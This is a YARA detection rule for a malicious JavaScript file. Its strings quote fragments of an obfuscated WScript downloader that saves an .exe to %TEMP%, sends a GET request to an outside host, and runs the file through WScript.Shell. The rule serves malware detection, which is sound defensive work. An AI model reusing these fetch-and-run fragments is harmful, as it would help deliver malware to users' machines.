rule sig_20160328_7097dbf838f2bbd0eb574f919187e228 {
  meta:
    description = "datamaliciousorder - file 20160328_7097dbf838f2bbd0eb574f919187e228.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ab7cdb28c4399bc4588c9a3b85f51ef34a2b07b4fb34c04e243b840676821af5"

  strings:
    $s1  = "function Vhglf() {return Lsqssshyf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"SuA9DafADe.exe\";};" fullword ascii
    $s2  = "Wbsfgca[Dwsnnsnp](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "function Ukgmterb(Wajrmjumae, Monrvm){return Wajrmjumae - Monrvm;};" fullword ascii
    $s4  = "var Lsqssshyf = function Yalxutd() {return WScript[Yuzjnv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "do {WScript[Rgobjx](Dfhmehd() * 11)} while (Wbsfgca[\"readystate\"] < 4 );" fullword ascii
    $s6  = "function Zhydsw(Ipfgrgvggl){Lsqssshyf[\"Run\"](Ipfgrgvggl, Kilkehqam, Kilkehqam);};" fullword ascii
    $s7  = "function Rkvicjtjo() {return ((Wejhr == true) && (Wejhr == Hqifgx)) ? 1 : Kilkehqam;};" fullword ascii
    $s8  = "Hqifgx = true; " fullword ascii
    $s9  = "function Mcefj(Kalytpwx) {var Rpfdoimc = (1, 2, 3, 4, 5, Kalytpwx); return Rpfdoimc;};" fullword ascii
    $s10 = "var Wejhr = false;" fullword ascii
    $s11 = "return Ukgmterb(Yksgpgl, Zumhbawmz);" fullword ascii
    $s12 = "var Lcwxgucd = false;" fullword ascii
    $s13 = "var Htfmsauoz = new this[\"Date\"]();" fullword ascii
    $s14 = "function Dfhmehd(){return 22;};" fullword ascii
    $s15 = " while (Lqvbf){" fullword ascii
    $s16 = "Wejhr = true; " fullword ascii
    $s17 = "function Sxpkfa(){return Fljln;};" fullword ascii
    $s18 = "var Hqifgx = false;" fullword ascii
    $s19 = "function Mbbjpvmy()" fullword ascii
    $s20 = "function Gvsili(){return Yuzjnv;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}